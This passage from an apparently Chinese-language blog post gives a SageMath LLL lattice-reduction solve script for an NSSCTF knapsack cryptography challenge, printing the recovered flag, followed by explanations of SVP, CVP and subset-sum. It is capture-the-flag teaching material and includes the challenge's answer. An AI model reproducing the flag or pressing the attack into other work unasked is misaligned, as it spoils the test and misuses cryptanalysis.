658120528784866057855535816473592722322169298000179779612012882313358423175649039080193638462832643733305319825615126939318011597571745161078002349049770598130580115865899839343415586079075440347787587511062111263934843436794855253861847153713339347334472866434244607004709981609245213357618753572246989625758916591937376893813802511070595248792, 923165870713742658604176441485371512725704171368190734093815112924737236834698256965081038400983272131993622216818771082580184329648259966949220187608103852014125863468940133921660870078263264692735488014749701978070083384952098412050091315352665469991029174814954869360791151573892351218672272162011360423119860076473904049412779148841857414952, 46679524274176608118770044852776345600583742226130828005923502297876413562879107806785061209787647846656681849917506266570277863669247751417346292547809207630897044039753998636225965608049650095525339205656722490651382161726502805139734354943231423831475614597757216042063968905958998214006179206249784506247813256860412147948395464320859422678, 841649127781864253971895938475185889229435052925101216399701219568840310811120657158345576407336048969543161838462294465486767294634023591853868458044819004460269187088712257852464750020899512115614605428080775088009952975739831978251526140066242337567389769912861093449733727377297221078944471106930294825940264368628887392384970201669445448247, 432666276070959604957255440160334742270474292180345149571990868756513229301157799899672116195996380080982179821477593638645293909141174680349323768321509533645021340843838126344841996857483122072465524834029114235557007336853951001010579215689313694893279922939379364666599131352427895235634068486716767600722759189401178893490598501579666572470, 202706922451946878091077195228185769743443456082725046511625635568905933572093772328302529286712750436467792389336815719247499548030188003834158143478561727237485704197436991106530359275484376488814227216781376201519119090515555892542781839600553981680658261260605132546229173697054652314581474398431095765518716122134297123450229786263132745802, 467399114517406836430065058317737323679209380751483565006214466214307867989685990903679008984612013604805300793643960994609679374712983504134462876065059977432980998618791553201105012398358454169656129408639396102558488533560502223394296295091149372387178701286323570188372381165466870556526911686107267099473610843203216210808851995092730246557, 693669798007474560639836946549879823249555291708909557534078589669257810449947611080811534519240768609221279022198150046925617192554964299088418221303075871975700612329641296093224048915194328618904650151386223555643601075306933265237427657335269303903859147351872265204036485134610655118673493793975435626909236842482996666640511682946373416622, 320760261928734528250973773982117794893270779219595366036035869762400887165778824559454124537715334183203335989201092297295215453249329904033497435838600276715910580360136617004070140259401870478831461311698063896356683245710231490976989606258300038166675904047471174792901145988917829306384319256120714778935358608606465337382580647935497839855, 716514726606473276006609020461506383149623399212849689303065301377066196204754712529975501561946827588652013350211837058556778395448209616180897427506916277339246562299308307449535477207299338921896614676443114475481128799675799543401031891757499868899442888870523905076579893960476827311724929298740905962687217989817314311607802047958326205250, 260836474073258979169586973851174064683468242789446195691451265985016799489655920821188833086430590927708056428466823406783075336825234406506828205467179081124514928921678799474903047595784119758612761475585621495738044200937693489006056561593231270327654603745208841990287720258042533153207806609174228399317256678705113628405715944572412998900, 382467800555203940400554062759061194251958240557360235288476483962772641413645543148946955166952765711315477882296911531020892728370708516474135360574432291317775132669473923812324532663852607274207943822401715155797074960639237600162836091827143207778800756489986231932778951156186399506600285437839557840357604228500485909300921979562919684729, 757621194098240282027907400593279125064722710855102740740239083531824455824002903189721629289710246515933671540288724509710647886205001317346048415486749105954338339203215621722242281387291269637052962536615891446107145265853786213468383658638997856784720798556998287117933260546025504883727063067493181271618212201051872509556604018012456501797, 1040839467637989566425293554746196983216662567192519852742386578230467186506793700775495423681042167873543584887991231360960357891668323321709673146291241224828337723227072614037770726842120038645895878062887702457744431560764341038693705153748688702867500078238904879270407033222274594581406620775377988325430129320399128995295549541400110003126, 612723292494780135967500428346787434735648527633058109977567964094441652968791956395078908011521589638593687384176540128557150947374199472125448959150311446775270183975669872831825074794937705918305091072751184362636879184311206224838221846907086098229741659447993337203295983240614912237392749332912822857460611208510192015694363886709375972520, 144223901521881785922758771779272642241752660833784713285199621103365423711564188694378372961022302305318778458012730574651677315376851760987502682804729872041412358822521413978921072472504877397317189285710462415143546596408285184366647899928397813368056685532845560031943648808504140455523336781533068567075674289934181055828188693554057544122, 447845417978470584581041832178038050302583610958644889070092234017855387942684189748336467353235254095172079732158391717727847926297902351731070655583803847635204213964213211061243356502569022002934484902515331909996769864458924968656368441608789107193925337105277104231397388325558195893070428008490316903866859053895618724276551737280217953936, 583007377468177144939585187335230316172951511481021809293378385664288339493793125865096702624036947340636878231663492192617914083699024239974559127015627233907007263917382167459144351034676624141445754732795422666015383626258266963690055267008309184076189246833163545918462810401181905191456951624559263983186421146023632181259963924477708424262, 800324454679933352106822591713103329162093964459108852663377657831774244371162876880489919367493598512425612161032800079107114950931718492391455255115080775852015299713892976612516480081006509642882353703422694844250776002115779694254134121548257053231314425443982676859392732147964856784623119350398358629954449451574405377804266709678411073655, 158271214956150152574594974433295691527064859712093104749179217533689150533917459899521085009967371740446150681987313223536485278087293973477965832841681909794974300681476405910587264034972960939581455855658254218567555112887002073145267094198730436870052211750340404409403663113007460575278946350981674773693660464495267032370104564634457893656, 713666122287083111128887852582233166850943071171771155115009028555966359858325149273694266065395499643557112440221877145508132137899934603974506451834423085343598929035860362035360572288576372613001219734798038660969402313220261051351874434394820831179420659545908259606202993211508262280733980848460093970135645975417501123315251061900878955819, 973165797461313015180297465051011097974737471537014588093649021787663918850886983814330391806082246214237760347802757290983313099153521833657601958837303849946706324068210101518219232689287255601596752558194439248080803487695984841314489208052910992850175231397889227233747549735194417245895411198018353477212380504012271314469933333803889110643, 596285861322380141670168481796181552366658715469228179646523265671523864133668675852918859251394557871814539801457028803341659940111809400664338440343616833138459280700950615188822328059287383386618683482261471846465037243319758249528066925698525653689526439719872609843025388392360017209878580276563345696268784216534792368708693676519889316542, 5517097174759582373180283529505392609370218237867329600967273270701424393845771537859694771089958216174222572684979287115451545085489457949154663746921721113753228245328328559402546616287069830696554731794596575399015764024380858610309920306815818729788596468703441068453820297871626548678021168842855993496792454439509533847317855594658819730, 345198043588636148232350800390247517493097327548966688617647578618301579016422653680256951513019744975069584737709623957269617409150655337410707811052287312048942932373035118008769727066079683994669033028275037005884558349281530713383278753161042618263926867235742661757842196755548650603330164633663134501729961873325743988921592499139171043726, 250109967039143054168259763775344330239146645196822423705331315667975277314985320349828101491247705091567451335218177638853787764502920164773019644887535073617457711110391953883034961438911037978376024923489764806773074940638320815535705226018262355682635210129542569156235101058431423871149232591650855514722350932975614263335621572781076104800, 235317092934531664756556784515500989058661356517743603572303350154379197492175925282351391713610015219064448632985231029805849482810062028499095235207050236048555984739288856240998949821422372467330468448993752151071473089720395670373450435475491785434152876035535202408724307162552183940744067061720455495165576100019762598987974189889769625920, 566380981022426624712121430602145583719672542216391428603874814702855143130588592317381914314613297205126425246477035711837542448329355928309058866091863808208599556531209712311828098381817342318440588824743046058969213528216777029744387498103950017222275878729106884112582115070083770635996312874805939400662546120023887017226076969876924331828, 850680139575041939721425955343157520599476599787618684008859058971905649162206411959087706961456689913464934489798278641587763847947491114575623444707105056772309703603350302078327821223277121888144108580906229040916937459361614669672523096364288763801319897305696738352380728250728371049294140008613221238917045661498184293353054265409526294883, 513340631700490731462730975966943167902736618822111370014808026778316513643463959920459812210321726359404848564466113425393072918834331716781885003699398359137000998225095919606033064393063585161112173298615508234725440486685204432900295209729798969584182120808594237271392126399658586679993244573657432668467918255665103990439516250365425521485, 233558163829196632328005860363299626289143441689686134813523415339428913253928396802393796598632624540082634960572090546887146393641045856512835100566291546569981375294802195466880891827802598641607357642373603897551698329045133976680352938067550918546209927242661007192584588148510622803875224197906442654183592300448706244094907931349924776602, 502426959547633094004891928999317040688159296264912537024417855958133926032629741677918991260480828267952053651598085399873092042302401291629421722536822969019242677547442283477197830651095218936802860003552898039013829005720761251780853376003502603534331668551615771772966651793027562568982617701422931444677052219095066054626221693786764798953, 576673554295414465210841111766426305797321178986878570644909746613688567968894012792351220144777120057434738190467260087776238915700933857936240521831504183390269951845506832585096341352665034772364158960611644245478291218153693947404811630265596255886310837464201707052306874515583105562865587050881261165540243319360069957961494145641974210080, 504135896383071300664165046486531313291049712809496521948491209494044511969599384935521111933604635289954812785120745073734437783715228879678915066624268193817875738082057586938905727949742494964258802143965751645105336769343831609269849837311247616686144509443398830300829712045868276715360364126253873059136083461450624430835288356767544977804, 922019925580986492646276168113733253537335705922386542452560980149684370417791879934025727119440761437443697106874800597158556540526919506827775073407113318587690728897796642212379858002985045632568125318337261923064998700484039276209238459064051294028216769377923456872623178242973223567220938358684775728614649513083930347054601150051734563579, 51870739281533135057815465693880574133882372699890081887653081590449428631887411766649949673943754707740670393476618348595275950380597194333475143660659001316208796062927270911409775635314284778571822470352406454613654562634100771049541555439538657744705542449007527522872250175599071850524741077391992491885772665105760436758849028240047784787, 581093144003344216063220440088780158010203286447170834048578036244802061063950755643665242371016902949288195254055179399697379780198923597326124258799014233490902496935477040346049678041375203186011379616899271686102175166404195736664519207628812127864235429659591027218466118506701806689792517427532418189033365973386608623118871681681275970580]</span><br><span class="line">c = 77376628019376673311531372348992445286793908614402191070546463231960965338625068420461932939579722257775290977616105002692887174722021983488949847381336050095777423958441982516041992872955033649666952328953257159369139125539634644867633316155815015993888621265583027756314957956170658163788675253859998755953779446426429307769521896999789665107673</span><br><span class="line"></span><br><span class="line">n = len(b)</span><br><span class="line">print(n)</span><br><span class="line">L = Matrix(ZZ, n+1, n+1)</span><br><span class="line"></span><br><span class="line">for i in range(n):</span><br><span class="line">    L[i,i] = 1</span><br><span class="line">    L[i,-1] = b[i]</span><br><span class="line">L[-1,-1] = -c</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"></span><br><span class="line">for i in range(n + 1):           # 循环从 0 到 n，依次遍历矩阵 res 的每一行，找最短向量</span><br><span class="line">    M = res.row(i).list()        # res.row(i) 用于获取矩阵 res 的第 i 行，list() 方法将这一行转换为 Python 列表 M，方便后续遍历。</span><br><span class="line">    flag = True                  # 初始化一个布尔变量 flag 为 True，用于标记当前行是否满足条件（即所有元素都只包含 0 和 1）。</span><br><span class="line">    for m in M:                  # 这是一个内层循环，用于遍历当前行 M 中的每一个元素 m。</span><br><span class="line">        if m != 0 and m != 1:    # 检查当前元素 m 是否既不等于 0 也不等于 1。如果是，则说明当前行不满足条件。</span><br><span class="line">            flag = False         # 如果当前元素 m 不满足条件，将 flag 设为 False，并使用 break 语句跳出内层循环，不再继续检查该行的其他元素。</span><br><span class="line">            break</span><br><span class="line">    if flag:</span><br><span class="line">        print(i, M)</span><br><span class="line"></span><br><span class="line">flag =  [1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1]</span><br><span class="line"></span><br><span class="line">flag = int(''.join(list(map(str, flag))), 2)    # 把二进制列表转换为十进制整数，再转为字节串</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(flag))</span><br><span class="line"></span><br><span class="line"># NSSCTF{4f7695b9-e026-4e9e-b456-bcf5}</span><br></pre></td></tr></table></figure>



<p>注意：</p>
<p>在sagemath中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if flag:</span><br><span class="line">        print(i, M)</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<p>287 [1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0]</p>
<p>结果是 n+1 行的数据，而最短的向量** v **是由前 n 个组成的，所以要把最后一个数 “0” 去掉，再转换。</p>
<h1 id="NvVcz">SVP问题&amp;CVP问题</h1>
<h2 id="CHeay">SVP</h2>
<font style="color:rgb(0, 0, 0);">最短向量问题（Shortest Vector Problem）</font>

<p><font style="color:rgb(0, 0, 0);">在格 L 中找到一个最短非零向量 </font><strong><font style="color:rgb(0, 0, 0);">v</font></strong><font style="color:rgb(0, 0, 0);"> ，满足 </font><strong><font style="color:rgb(0, 0, 0);">v </font></strong><font style="color:rgb(0, 0, 0);">∈ L 且 ∥</font><strong><font style="color:rgb(0, 0, 0);">v</font></strong><font style="color:rgb(0, 0, 0);">∥ 最小。</font></p>
<p><font style="color:rgb(0, 0, 0);">最短的向量显然可能不止一个，例如在</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                                     </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.431ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 6820.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mrow" transform="translate(2014.6,0)"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mtable" transform="translate(278,0)"><g data-mml-node="mtr"><g data-mml-node="mtd"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g><g data-mml-node="mtd" transform="translate(1500,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mtext" transform="translate(500,0)"><path data-c="A0" d=""/></g><g data-mml-node="mn" transform="translate(750,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mtd" transform="translate(3750,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></g><g data-mml-node="mo" transform="translate(4528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">     </font></p>
<p><font style="color:rgb(0, 0, 0);">中 (0,±1) , (±1,0) 都是最短向量，所以SVP只要求我们找到其中任意一个即可。</font></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<h2 id="l0UgQ"><font style="color:rgb(0, 0, 0);">CVP</font></h2>
<font style="color:rgb(0, 0, 0);">最近向量问题（Closest Vector Problem）</font>

<p><font style="color:rgb(0, 0, 0);">给定一个不在格 L 中的向量</font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.09ex;" xmlns="http://www.w3.org/2000/svg" width="7.872ex" height="1.636ex" role="img" focusable="false" viewbox="0 -683 3479.4 723"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D498" d="M636 367Q636 400 664 426T719 453Q748 453 772 431T796 357Q796 321 782 256T727 112T633 6Q604 -8 567 -8Q466 -8 415 43Q414 42 410 38T403 31T396 25T388 18T378 11T367 5T355 0T340 -4T324 -7T306 -8Q249 -8 209 5T151 40T125 84T117 129Q117 176 153 274T190 388Q190 408 158 396Q112 376 90 306Q85 288 81 285T61 282H55H44Q24 282 24 296Q24 305 34 328T63 380T114 430T187 452Q240 452 274 427T309 362Q309 346 275 255T240 117Q240 43 317 43Q325 43 333 45T347 50T359 57T369 66T377 75T383 83T388 90L390 95Q390 99 389 110T387 129Q387 139 391 167Q393 177 419 282T448 396Q456 414 475 429T519 444Q546 444 559 428T572 397Q572 384 542 265T511 114Q511 43 579 43Q608 43 633 66T673 122T699 188T714 244L718 267Q718 291 673 315Q636 335 636 367Z"/></g><g data-mml-node="mo" transform="translate(1108.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"/></g><g data-mml-node="msup" transform="translate(2053.6,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="211D" d="M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z"/></g></g><g data-mml-node="mi" transform="translate(755,363) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">，找到一个向量</font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.09ex;" xmlns="http://www.w3.org/2000/svg" width="5.589ex" height="1.636ex" role="img" focusable="false" viewbox="0 -683 2470.6 723"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mo" transform="translate(844.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"/></g><g data-mml-node="mi" transform="translate(1789.6,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">，满足</font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="7.187ex" height="2.26ex" role="img" focusable="false" viewbox="0 -749.5 3176.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mo" transform="translate(1067.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mi" transform="translate(2067.4,0)"><path data-c="1D498" d="M636 367Q636 400 664 426T719 453Q748 453 772 431T796 357Q796 321 782 256T727 112T633 6Q604 -8 567 -8Q466 -8 415 43Q414 42 410 38T403 31T396 25T388 18T378 11T367 5T355 0T340 -4T324 -7T306 -8Q249 -8 209 5T151 40T125 84T117 129Q117 176 153 274T190 388Q190 408 158 396Q112 376 90 306Q85 288 81 285T61 282H55H44Q24 282 24 296Q24 305 34 328T63 380T114 430T187 452Q240 452 274 427T309 362Q309 346 275 255T240 117Q240 43 317 43Q325 43 333 45T347 50T359 57T369 66T377 75T383 83T388 90L390 95Q390 99 389 110T387 129Q387 139 391 167Q393 177 419 282T448 396Q456 414 475 429T519 444Q546 444 559 428T572 397Q572 384 542 265T511 114Q511 43 579 43Q608 43 633 66T673 122T699 188T714 244L718 267Q718 291 673 315Q636 335 636 367Z"/></g><g data-mml-node="mo" transform="translate(2898.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">最小。</font></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<h3 id="Jvxj6"><font style="color:rgb(0, 0, 0);">背包问题</font></h3>
<font style="color:rgb(0, 0, 0);">子集和问题</font>

<p><font style="color:rgb(0, 0, 0);">找到一个</font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="1.71ex" height="1.927ex" role="img" focusable="false" viewbox="0 -694 756 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(462,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">的子集</font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" 